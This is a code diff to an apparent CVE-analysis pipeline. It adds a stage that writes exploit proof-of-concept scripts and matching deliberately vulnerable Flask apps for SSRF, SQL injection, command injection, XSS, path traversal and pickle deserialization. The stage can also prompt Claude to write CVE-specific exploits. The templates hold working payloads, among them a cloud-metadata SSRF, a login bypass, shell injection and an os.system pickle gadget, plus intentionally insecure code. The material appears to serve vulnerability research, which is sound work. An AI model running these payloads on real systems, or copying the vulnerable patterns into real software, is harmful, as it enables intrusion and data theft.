@@ -196,6 +196,17 @@ class SSRFProbeResult(BaseModel):
     bypass_results:     list[dict]  = Field(default_factory=list)
 
 
+class ExploitArtifacts(BaseModel):
+    """Stage 3.5 — generated exploit PoC + minimal vulnerable target app."""
+    generated:       bool = False
+    skip_reason:     str  = ""
+    poc_path:        str  = ""   # absolute path to poc.py
+    target_app_path: str  = ""   # absolute path to target_app.py
+    vuln_class:      str  = ""
+    poc_summary:     str  = ""   # one-line description of what the PoC does
+    iterations:      int  = 1    # generation attempt number (v0, v1, …)
+
+
 class PipelineReport(BaseModel):
     """Final structured report — this is what the agent must produce."""
 
@@ -208,6 +219,7 @@ class PipelineReport(BaseModel):
     advisory:          AdvisoryResult     | None = None
     analysis:          VulnAnalysisResult | None = None
     ssrf_probe:        SSRFProbeResult    | None = None
+    exploit_artifacts: ExploitArtifacts   | None = None
 
     overall_risk:      str = "UNKNOWN"   # CRITICAL | HIGH | MEDIUM | LOW | UNKNOWN
     summary:           str = ""
@@ -519,7 +531,7 @@ def analyze_vulnerability(
                 "confidence":          report.confidence,
                 "unsafe_patterns":     report.unsafe_patterns,
                 "changed_functions":   report.changed_functions,
-                "fix_summary":         report.fix_description.get("summary", ""),
+                "fix_summary":         report.fix_description.get("summary") or "",
                 "trigger_conditions":  report.trigger_conditions,
                 "diff_summary":        report.diff_summary,
             }
@@ -533,7 +545,7 @@ def analyze_vulnerability(
                 "confidence":          "MEDIUM",
                 "unsafe_patterns":     [],
                 "changed_functions":   [],
-                "fix_summary":         advisory.get("root_cause", ""),
+                "fix_summary":         advisory.get("root_cause") or "",
                 "trigger_conditions":  _trigger_from_class(vuln_class),
                 "diff_summary":        {},
             }
@@ -1576,6 +1588,679 @@ run_ssrf_probe = run_vuln_probe
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Stage 3.5 — Exploit artifact generation (poc.py + target_app.py)
+# ─────────────────────────────────────────────────────────────────────────────
+
+_POC_TEMPLATE: dict[str, tuple[str, str]] = {
+    # (poc.py body, target_app.py body) keyed by vuln class
+    "SSRF": (
+        '''\
+#!/usr/bin/env python3
+"""PoC for {cve_id} — Server-Side Request Forgery (SSRF)
+Usage: python poc.py [host:port]
+Exit : 0=exploited  1=failed
+"""
+import sys, requests
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
+BASE   = f"http://{{TARGET}}"
+
+def health():
+    r = requests.get(f"{{BASE}}/health", timeout=5)
+    assert r.status_code == 200, "target unreachable"
+    print("[*] Target reachable")
+
+def exploit():
+    # Craft SSRF payload pointing to internal metadata / loopback
+    payload = {{"url": "http://169.254.169.254/latest/meta-data/"}}
+    r = requests.post(f"{{BASE}}/fetch", json=payload, timeout=10)
+    return r
+
+def verify(r):
+    return r.status_code == 200 and ("ami-id" in r.text or "internal" in r.text.lower())
+
+if __name__ == "__main__":
+    health()
+    r = exploit()
+    if verify(r):
+        print(f"[+] EXPLOITED — internal response: {{r.text[:200]}}")
+        sys.exit(0)
+    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
+    sys.exit(1)
+''',
+        '''\
+#!/usr/bin/env python3
+"""Minimal vulnerable target for {cve_id} — SSRF
+Run: python target_app.py
+Then: python poc.py 127.0.0.1:5000
+"""
+from flask import Flask, request, jsonify
+import requests as _req
+
+app = Flask(__name__)
+
+@app.route("/health")
+def health():
+    return jsonify({{"status": "ok", "cve": "{cve_id}"}})
+
+@app.route("/fetch", methods=["POST"])
+def fetch():
+    """Vulnerable: fetches any user-supplied URL without SSRF validation."""
+    url = request.json.get("url", "")
+    if not url:
+        return jsonify({{"error": "url required"}}), 400
+    try:
+        r = _req.get(url, timeout=3)
+        return jsonify({{"status": r.status_code, "body": r.text[:500]}})
+    except Exception as e:
+        return jsonify({{"error": str(e)}}), 500
+
+if __name__ == "__main__":
+    print("Vulnerable SSRF target running on :5000")
+    app.run(port=5000, debug=False)
+''',
+    ),
+    "SQLi": (
+        '''\
+#!/usr/bin/env python3
+"""PoC for {cve_id} — SQL Injection
+Usage: python poc.py [host:port]
+Exit : 0=exploited  1=failed
+"""
+import sys, requests
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
+BASE   = f"http://{{TARGET}}"
+
+def health():
+    r = requests.get(f"{{BASE}}/health", timeout=5)
+    assert r.status_code == 200, "target unreachable"
+    print("[*] Target reachable")
+
+def exploit():
+    # Classic boolean-based blind SQLi bypass
+    payload = {{"username": "admin' OR '1'='1", "password": "x"}}
+    r = requests.post(f"{{BASE}}/login", json=payload, timeout=10)
+    return r
+
+def verify(r):
+    body = r.text.lower()
+    return r.status_code == 200 and ("welcome" in body or "token" in body or "success" in body)
+
+if __name__ == "__main__":
+    health()
+    r = exploit()
+    if verify(r):
+        print(f"[+] EXPLOITED — auth bypass: {{r.text[:200]}}")
+        sys.exit(0)
+    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
+    sys.exit(1)
+''',
+        '''\
+#!/usr/bin/env python3
+"""Minimal vulnerable target for {cve_id} — SQL Injection
+Run: python target_app.py
+Then: python poc.py 127.0.0.1:5000
+"""
+from flask import Flask, request, jsonify
+import sqlite3, os
+
+app = Flask(__name__)
+DB  = "/tmp/vuln_{cve_safe}.db"
+
+def _init_db():
+    con = sqlite3.connect(DB)
+    con.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)")
+    con.execute("INSERT OR IGNORE INTO users VALUES (1,'admin','secret','admin')")
+    con.execute("INSERT OR IGNORE INTO users VALUES (2,'user','pass','user')")
+    con.commit(); con.close()
+
+@app.route("/health")
+def health():
+    return jsonify({{"status": "ok", "cve": "{cve_id}"}})
+
+@app.route("/login", methods=["POST"])
+def login():
+    """Vulnerable: raw string interpolation in SQL query."""
+    data = request.json or {{}}
+    u, p = data.get("username",""), data.get("password","")
+    con  = sqlite3.connect(DB)
+    # VULNERABLE — do NOT use in production
+    query = f"SELECT * FROM users WHERE username='{{u}}' AND password='{{p}}'"
+    row   = con.execute(query).fetchone()
+    con.close()
+    if row:
+        return jsonify({{"status":"ok","role": row[3],"token":"welcome-" + row[1]}})
+    return jsonify({{"status":"fail"}}), 401
+
+if __name__ == "__main__":
+    _init_db()
+    print("Vulnerable SQLi target running on :5000")
+    app.run(port=5000, debug=False)
+''',
+    ),
+    "CMDi": (
+        '''\
+#!/usr/bin/env python3
+"""PoC for {cve_id} — Command Injection
+Usage: python poc.py [host:port]
+Exit : 0=exploited  1=failed
+"""
+import sys, requests
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
+BASE   = f"http://{{TARGET}}"
+
+def health():
+    r = requests.get(f"{{BASE}}/health", timeout=5)
+    assert r.status_code == 200, "target unreachable"
+    print("[*] Target reachable")
+
+def exploit():
+    # Inject `id` command via semicolon separator
+    payload = {{"host": "127.0.0.1; id"}}
+    r = requests.post(f"{{BASE}}/ping", json=payload, timeout=10)
+    return r
+
+def verify(r):
+    return r.status_code == 200 and ("uid=" in r.text or "root" in r.text)
+
+if __name__ == "__main__":
+    health()
+    r = exploit()
+    if verify(r):
+        print(f"[+] EXPLOITED — command output: {{r.text[:200]}}")
+        sys.exit(0)
+    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
+    sys.exit(1)
+''',
+        '''\
+#!/usr/bin/env python3
+"""Minimal vulnerable target for {cve_id} — Command Injection
+Run: python target_app.py
+Then: python poc.py 127.0.0.1:5000
+"""
+from flask import Flask, request, jsonify
+import subprocess
+
+app = Flask(__name__)
+
+@app.route("/health")
+def health():
+    return jsonify({{"status": "ok", "cve": "{cve_id}"}})
+
+@app.route("/ping", methods=["POST"])
+def ping():
+    """Vulnerable: passes user input directly to shell."""
+    host = request.json.get("host", "127.0.0.1")
+    # VULNERABLE — shell=True + unsanitised input
+    result = subprocess.run(f"ping -c 1 {{host}}", shell=True,
+                            capture_output=True, text=True, timeout=5)
+    return jsonify({{"stdout": result.stdout, "stderr": result.stderr}})
+
+if __name__ == "__main__":
+    print("Vulnerable CMDi target running on :5000")
+    app.run(port=5000, debug=False)
+''',
+    ),
+    "XSS": (
+        '''\
+#!/usr/bin/env python3
+"""PoC for {cve_id} — Cross-Site Scripting (XSS)
+Usage: python poc.py [host:port]
+Exit : 0=exploited  1=failed
+"""
+import sys, requests
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
+BASE   = f"http://{{TARGET}}"
+
+XSS_PAYLOAD = "<script>document.cookie</script>"
+
+def health():
+    r = requests.get(f"{{BASE}}/health", timeout=5)
+    assert r.status_code == 200, "target unreachable"
+    print("[*] Target reachable")
+
+def exploit():
+    # POST XSS payload as user input, retrieve rendered page
+    r = requests.post(f"{{BASE}}/comment", json={{"text": XSS_PAYLOAD}}, timeout=10)
+    page = requests.get(f"{{BASE}}/comments", timeout=10)
+    return page
+
+def verify(r):
+    return XSS_PAYLOAD in r.text
+
+if __name__ == "__main__":
+    health()
+    r = exploit()
+    if verify(r):
+        print(f"[+] EXPLOITED — raw payload reflected in response")
+        sys.exit(0)
+    print(f"[-] FAILED — payload not found in response")
+    sys.exit(1)
+''',
+        '''\
+#!/usr/bin/env python3
+"""Minimal vulnerable target for {cve_id} — XSS
+Run: python target_app.py
+Then: python poc.py 127.0.0.1:5000
+"""
+from flask import Flask, request, jsonify, make_response
+
+app    = Flask(__name__)
+_store = []
+
+@app.route("/health")
+def health():
+    return jsonify({{"status": "ok", "cve": "{cve_id}"}})
+
+@app.route("/comment", methods=["POST"])
+def post_comment():
+    """Stores user input without sanitisation."""
+    text = request.json.get("text", "")
+    _store.append(text)
+    return jsonify({{"stored": len(_store)}})
+
+@app.route("/comments")
+def get_comments():
+    """Vulnerable: renders stored comments without HTML escaping."""
+    html = "<html><body>" + "".join(f"<p>{{c}}</p>" for c in _store) + "</body></html>"
+    resp = make_response(html)
+    resp.headers["Content-Type"] = "text/html"
+    return resp
+
+if __name__ == "__main__":
+    print("Vulnerable XSS target running on :5000")
+    app.run(port=5000, debug=False)
+''',
+    ),
+    "PathTraversal": (
+        '''\
+#!/usr/bin/env python3
+"""PoC for {cve_id} — Path Traversal
+Usage: python poc.py [host:port]
+Exit : 0=exploited  1=failed
+"""
+import sys, requests
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
+BASE   = f"http://{{TARGET}}"
+
+def health():
+    r = requests.get(f"{{BASE}}/health", timeout=5)
+    assert r.status_code == 200, "target unreachable"
+    print("[*] Target reachable")
+
+def exploit():
+    # Classic ../ traversal to reach /etc/passwd (Linux) or win.ini (Windows)
+    for path in ["../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd"]:
+        r = requests.get(f"{{BASE}}/file", params={{"name": path}}, timeout=10)
+        if r.status_code == 200:
+            return r
+    return r
+
+def verify(r):
+    return r.status_code == 200 and ("root:" in r.text or "[fonts]" in r.text)
+
+if __name__ == "__main__":
+    health()
+    r = exploit()
+    if verify(r):
+        print(f"[+] EXPLOITED — file read: {{r.text[:200]}}")
+        sys.exit(0)
+    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
+    sys.exit(1)
+''',
+        '''\
+#!/usr/bin/env python3
+"""Minimal vulnerable target for {cve_id} — Path Traversal
+Run: python target_app.py
+Then: python poc.py 127.0.0.1:5000
+"""
+from flask import Flask, request
+import os
+
+app      = Flask(__name__)
+BASE_DIR = "/tmp/safe_files_{cve_safe}"
+os.makedirs(BASE_DIR, exist_ok=True)
+
+# Seed some files
+with open(os.path.join(BASE_DIR, "welcome.txt"), "w") as f:
+    f.write("Welcome to the file server.")
+
+@app.route("/health")
+def health():
+    from flask import jsonify
+    return jsonify({{"status": "ok", "cve": "{cve_id}"}})
+
+@app.route("/file")
+def read_file():
+    """Vulnerable: joins user-supplied name to BASE_DIR without canonicalisation."""
+    name = request.args.get("name", "welcome.txt")
+    # VULNERABLE — no os.path.realpath() check
+    path = os.path.join(BASE_DIR, name)
+    try:
+        with open(path) as f:
+            return f.read(), 200, {{"Content-Type": "text/plain"}}
+    except FileNotFoundError:
+        return "not found", 404
+    except PermissionError:
+        return "permission denied", 403
+
+if __name__ == "__main__":
+    print("Vulnerable PathTraversal target running on :5000")
+    app.run(port=5000, debug=False)
+''',
+    ),
+    "Deserialization": (
+        '''\
+#!/usr/bin/env python3
+"""PoC for {cve_id} — Unsafe Deserialization (pickle RCE)
+Usage: python poc.py [host:port]
+Exit : 0=exploited  1=failed
+"""
+import sys, pickle, base64, os, requests
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
+BASE   = f"http://{{TARGET}}"
+
+class _RCE:
+    """Pickle gadget — executes a command via __reduce__."""
+    def __reduce__(self):
+        return (os.system, ("id > /tmp/pwned_{cve_safe}.txt",))
+
+def health():
+    r = requests.get(f"{{BASE}}/health", timeout=5)
+    assert r.status_code == 200, "target unreachable"
+    print("[*] Target reachable")
+
+def exploit():
+    payload = base64.b64encode(pickle.dumps(_RCE())).decode()
+    r = requests.post(f"{{BASE}}/load", json={{"data": payload}}, timeout=10)
+    return r
+
+def verify(r):
+    return r.status_code != 500 and os.path.exists("/tmp/pwned_{cve_safe}.txt")
+
+if __name__ == "__main__":
+    health()
+    r = exploit()
+    if verify(r):
+        print("[+] EXPLOITED — RCE via pickle gadget, see /tmp/pwned_{cve_safe}.txt")
+        sys.exit(0)
+    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
+    sys.exit(1)
+''',
+        '''\
+#!/usr/bin/env python3
+"""Minimal vulnerable target for {cve_id} — Unsafe Deserialization
+Run: python target_app.py
+Then: python poc.py 127.0.0.1:5000
+"""
+from flask import Flask, request, jsonify
+import pickle, base64
+
+app = Flask(__name__)
+
+@app.route("/health")
+def health():
+    return jsonify({{"status": "ok", "cve": "{cve_id}"}})
+
+@app.route("/load", methods=["POST"])
+def load_data():
+    """Vulnerable: deserialises arbitrary base64-encoded pickle data."""
+    raw = request.json.get("data", "")
+    try:
+        obj = pickle.loads(base64.b64decode(raw))   # VULNERABLE
+        return jsonify({{"loaded": str(obj)}})
+    except Exception as e:
+        return jsonify({{"error": str(e)}}), 400
+
+if __name__ == "__main__":
+    print("Vulnerable Deserialization target running on :5000")
+    app.run(port=5000, debug=False)
+''',
+    ),
+}
+
+# Generic fallback for UNKNOWN / unrecognised class
+_POC_TEMPLATE["UNKNOWN"] = (
+    '''\
+#!/usr/bin/env python3
+"""PoC for {cve_id} — {vuln_class} (generic template)
+Usage: python poc.py [host:port]
+Exit : 0=exploited  1=failed
+
+TODO: Fill in exploit logic specific to this CVE.
+Root cause: {root_cause}
+Fix summary: {fix_summary}
+"""
+import sys, requests
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
+BASE   = f"http://{{TARGET}}"
+
+def health():
+    r = requests.get(f"{{BASE}}/health", timeout=5)
+    assert r.status_code == 200, "target unreachable"
+    print("[*] Target reachable")
+
+def exploit():
+    # TODO: implement exploit for {cve_id}
+    raise NotImplementedError("Exploit not yet implemented for {vuln_class}")
+
+def verify(r):
+    return False
+
+if __name__ == "__main__":
+    health()
+    try:
+        r = exploit()
+        if verify(r):
+            print("[+] EXPLOITED")
+            sys.exit(0)
+    except NotImplementedError as e:
+        print(f"[!] {{e}}")
+    print("[-] FAILED / NOT IMPLEMENTED")
+    sys.exit(1)
+''',
+    '''\
+#!/usr/bin/env python3
+"""Minimal target app for {cve_id} — {vuln_class}
+Run: python target_app.py
+Then: python poc.py 127.0.0.1:5000
+
+TODO: Implement the vulnerability pattern specific to {cve_id}.
+Root cause: {root_cause}
+"""
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+@app.route("/health")
+def health():
+    return jsonify({{"status": "ok", "cve": "{cve_id}"}})
+
+@app.route("/test", methods=["GET", "POST"])
+def test():
+    """TODO: implement vulnerable endpoint for {vuln_class}."""
+    return jsonify({{"message": "endpoint not yet implemented"}})
+
+if __name__ == "__main__":
+    print("Target app for {cve_id} running on :5000")
+    app.run(port=5000, debug=False)
+''',
+)
+
+
+def _render_artifact(template: str, *, cve_id: str, vuln_class: str,
+                     root_cause: str, fix_summary: str) -> str:
+    """Fill template placeholders."""
+    cve_safe = cve_id.replace("-", "_").replace(" ", "_")
+    return template.format(
+        cve_id=cve_id,
+        cve_safe=cve_safe,
+        vuln_class=vuln_class,
+        root_cause=(root_cause or "see advisory")[:200],
+        fix_summary=(fix_summary or "see advisory")[:200],
+    )
+
+
+def generate_exploit_artifacts(
+    cve_id:      str,
+    advisory:    dict,
+    analysis:    dict,
+    probe:       dict,
+    reports_dir: Path,
+) -> ExploitArtifacts:
+    """
+    Stage 3.5 — Generate a runnable poc.py and target_app.py for this CVE.
+
+    Strategy:
+      1. Ask claude -p to write both files with full CVE context.
+      2. If Claude is unavailable, fall back to class-specific templates.
+
+    Files are saved to reports/<CVE-ID>/poc.iter1.v0.py
+                                        reports/<CVE-ID>/target_app.iter1.v0.py
+    """
+    vuln_class  = analysis.get("vulnerability_class", "UNKNOWN")
+    root_cause  = advisory.get("root_cause")  or advisory.get("raw_description") or ""
+    fix_summary = analysis.get("fix_summary") or ""
+    package     = advisory.get("package_name") or "unknown"
+    ecosystem   = advisory.get("ecosystem")    or "unknown"
+    cvss        = advisory.get("cvss_score")   or "N/A"
+    cwe         = analysis.get("cwe")          or "N/A"
+
+    out_dir = reports_dir / cve_id
+    out_dir.mkdir(parents=True, exist_ok=True)
+
+    poc_path    = out_dir / "poc.iter1.v0.py"
+    target_path = out_dir / "target_app.iter1.v0.py"
+
+    log.info("[Stage 3.5] Generating exploit artifacts for %s (%s) …", cve_id, vuln_class)
+
+    # ── 1. Try Claude -p for AI-generated, CVE-specific code ─────────────────
+    poc_code    = ""
+    target_code = ""
+
+    if _claude_available():
+        prompt = f"""\
+You are a security researcher writing a PoC exploit and a minimal vulnerable target \
+app for a specific CVE. Follow the EXACT output format below — no preamble, no markdown.
+
+CVE: {cve_id}
+Package: {package} ({ecosystem})
+CVSS: {cvss}  CWE: {cwe}
+Vulnerability class: {vuln_class}
+Root cause: {root_cause[:500]}
+Fix summary: {fix_summary[:300]}
+
+Output EXACTLY two sections separated by the markers shown:
+
+===POC_START===
+#!/usr/bin/env python3
+\"\"\"PoC for {cve_id} — {vuln_class}
+Usage: python poc.py [host:port]
+Exit : 0=exploited  1=failed
+\"\"\"
+# ... complete self-contained Python exploit following this 4-phase pattern:
+# 1. health() — verify target reachable
+# 2. exploit() — send malicious payload
+# 3. verify(r) — check response for exploitation indicator
+# 4. main block — print [+]EXPLOITED exit 0, or [-]FAILED exit 1
+===POC_END===
+
+===TARGET_START===
+#!/usr/bin/env python3
+\"\"\"Minimal vulnerable Flask app for {cve_id} — {vuln_class}
+Run: python target_app.py   (listens on :5000)
+Then: python poc.py 127.0.0.1:5000
+\"\"\"
+# ... minimal Flask app that demonstrates the vulnerability
+# Must have: GET /health -> {{"status":"ok"}}
+# Must have: at least one endpoint that replicates the vulnerable pattern
+===TARGET_END===
+
+Important rules:
+- Both files must be runnable with only stdlib + requests/flask/werkzeug.
+- The PoC must exit 0 on success, 1 on failure.
+- Target app must listen on port 5000.
+- Tailor the exploit to the SPECIFIC vulnerability class and root cause above.
+- No markdown fences, no explanations outside the markers.
+"""
+        raw = _call_claude(prompt, timeout=180)
+
+        if raw:
+            # Extract between markers
+            def _extract(text: str, start: str, end: str) -> str:
+                try:
+                    s = text.index(start) + len(start)
+                    e = text.index(end, s)
+                    return text[s:e].strip()
+                except ValueError:
+                    return ""
+
+            poc_code    = _extract(raw, "===POC_START===",    "===POC_END===")
+            target_code = _extract(raw, "===TARGET_START===", "===TARGET_END===")
+
+            if poc_code and target_code:
+                log.info("[Stage 3.5] AI-generated artifacts for %s", cve_id)
+
+    # ── 2. Fallback: class-specific template ──────────────────────────────────
+    # Map long-form class names (returned by the analysis stage) to _POC_TEMPLATE keys.
+    _CLASS_NORM: dict[str, str] = {
+        "sql injection":                    "SQLi",
+        "sqli":                             "SQLi",
+        "cross-site scripting":             "XSS",
+        "cross-site scripting (xss)":       "XSS",
+        "xss":                              "XSS",
+        "os command injection":             "CMDi",
+        "command injection":                "CMDi",
+        "cmdi":                             "CMDi",
+        "server-side request forgery":      "SSRF",
+        "ssrf":                             "SSRF",
+        "path traversal":                   "PathTraversal",
+        "directory traversal":              "PathTraversal",
+        "pathtraversal":                    "PathTraversal",
+        "deserialization":                  "Deserialization",
+        "insecure deserialization":         "Deserialization",
+    }
+    if not poc_code or not target_code:
+        normalized = _CLASS_NORM.get(vuln_class.lower(), vuln_class)
+        tmpl_key   = normalized if normalized in _POC_TEMPLATE else "UNKNOWN"
+        poc_tmpl, target_tmpl = _POC_TEMPLATE[tmpl_key]
+        kw = dict(cve_id=cve_id, vuln_class=vuln_class,
+                  root_cause=root_cause, fix_summary=fix_summary)
+        if not poc_code:
+            poc_code    = _render_artifact(poc_tmpl,    **kw)
+            log.info("[Stage 3.5] Using %s template for poc.py", tmpl_key)
+        if not target_code:
+            target_code = _render_artifact(target_tmpl, **kw)
+            log.info("[Stage 3.5] Using %s template for target_app.py", tmpl_key)
+
+    # ── 3. Write files ────────────────────────────────────────────────────────
+    try:
+        poc_path.write_text(poc_code,    encoding="utf-8")
+        target_path.write_text(target_code, encoding="utf-8")
+        log.info("[Stage 3.5] Artifacts written → %s/", out_dir.name)
+
+        poc_summary = f"{vuln_class} exploit against {package} ({ecosystem})"
+
+        return ExploitArtifacts(
+            generated       = True,
+            poc_path        = str(poc_path),
+            target_app_path = str(target_path),
+            vuln_class      = vuln_class,
+            poc_summary     = poc_summary,
+            iterations      = 1,
+        )
+    except Exception as exc:
+        log.warning("[Stage 3.5] Failed to write artifacts: %s", exc)
+        return ExploitArtifacts(generated=False, skip_reason=str(exc))
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Tool 4 — Report assembly
 # ─────────────────────────────────────────────────────────────────────────────
 
@@ -1798,6 +2483,26 @@ def render_text(report: PipelineReport) -> str:
     for i, rec in enumerate(report.recommendations, 1):
         lines.append(wrap(f"{i}. {rec}", indent=4))
 
+    # ── Exploit artifacts (Stage 3.5) ─────────────────────────────────────────
+    art = report.exploit_artifacts
+    if art:
+        lines += ["", sep2, "  EXPLOIT ARTIFACTS", sep2]
+        if art.generated:
+            lines += [
+                f"  Status      : GENERATED (iter 1, v0)",
+                f"  PoC         : {art.poc_path}",
+                f"  Target app  : {art.target_app_path}",
+                f"  Summary     : {art.poc_summary}",
+                "",
+                "  Usage:",
+                f"    # Terminal 1 — start vulnerable target",
+                f"    python \"{art.target_app_path}\"",
+                f"    # Terminal 2 — run exploit",
+                f"    python \"{art.poc_path}\" 127.0.0.1:5000",
+            ]
+        else:
+            lines.append(f"  Status      : SKIPPED — {art.skip_reason}")
+
     if report.errors:
         lines += ["", sep2, "  ERRORS", sep2]
         for err in report.errors:
@@ -1911,6 +2616,22 @@ async def _run_pipeline_direct(deps: PipelineDeps) -> PipelineReport:
     code_after   = diff_summary.get("code_after",  "") if isinstance(diff_summary, dict) else ""
     probe = run_vuln_probe(ctx, vuln_class, code_before, code_after)
 
+    # ── Stage 3.5: generate exploit artifacts (poc.py + target_app.py) ───────
+    reports_dir = deps.cache.root.parent / "reports"
+    artifacts = ExploitArtifacts(generated=False, skip_reason="not run")
+    try:
+        artifacts = generate_exploit_artifacts(
+            cve_id      = deps.cve_id,
+            advisory    = advisory,
+            analysis    = analysis,
+            probe       = probe,
+            reports_dir = reports_dir,
+        )
+        deps.completed.append("3.5_artifacts")
+    except Exception as exc:
+        log.warning("[Stage 3.5] Error: %s", exc)
+        deps.failed.append("3.5_artifacts")
+
     # ── Stage 4: compile report ───────────────────────────────────────────────
     report_dict = compile_report(
         ctx,
@@ -1954,8 +2675,22 @@ async def _run_pipeline_direct(deps: PipelineDeps) -> PipelineReport:
 
     # ── Build PipelineReport from the compiled dict ───────────────────────────
     def _sub(model, data: dict):
-        """Safely construct a pydantic model, ignoring unknown keys."""
-        valid = {k: v for k, v in data.items() if k in model.model_fields}
+        """Safely construct a pydantic model, ignoring unknown keys.
+
+        Coerces None → field default for str fields so cached null values
+        (e.g. fix_summary: null) don't raise pydantic validation errors.
+        """
+        valid = {}
+        for k, v in data.items():
+            if k not in model.model_fields:
+                continue
+            if v is None:
+                field_info = model.model_fields[k]
+                # Use the field's default if it is a plain value (not a factory)
+                default = field_info.default
+                if default is not None and not callable(default):
+                    v = default
+            valid[k] = v
         return model(**valid)
 
     advisory_obj  = _sub(AdvisoryResult,     advisory)  if advisory  else None
@@ -1972,6 +2707,7 @@ async def _run_pipeline_direct(deps: PipelineDeps) -> PipelineReport:
         advisory         = advisory_obj,
         analysis         = analysis_obj,
         ssrf_probe       = probe_obj,
+        exploit_artifacts = artifacts,
         overall_risk     = report_dict.get("overall_risk",     "UNKNOWN"),
         summary          = report_dict.get("summary",          ""),
         recommendations  = report_dict.get("recommendations",  []),
